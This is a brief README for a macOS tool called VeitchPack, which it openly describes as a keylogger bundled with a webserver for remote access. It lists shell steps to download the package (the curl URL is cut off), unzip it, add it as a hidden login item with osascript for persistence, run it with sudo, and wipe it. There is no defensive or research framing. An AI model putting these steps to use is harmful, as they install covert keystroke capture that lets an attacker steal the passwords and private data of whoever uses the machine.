# VeitchPack
A keylogger bundled with a webserver. For remote access goodies on OSX... best done via ssh.
### Download
~~~~
curl -o "VeitchPack.zip" s
unzip VeitchPack.zip
~~~~

### Add to StartUp
~~~~
echo `pwd`/`ls launch.command`
osascript -e 'tell application "System Events" to make login item at end with properties {path:"PATH_HERE", hidden:true}'
~~~~

### Run
~~~~
sudo ./launch.command
~~~~

### Wipe
~~~~
sudo ./wipe.command
~~~~
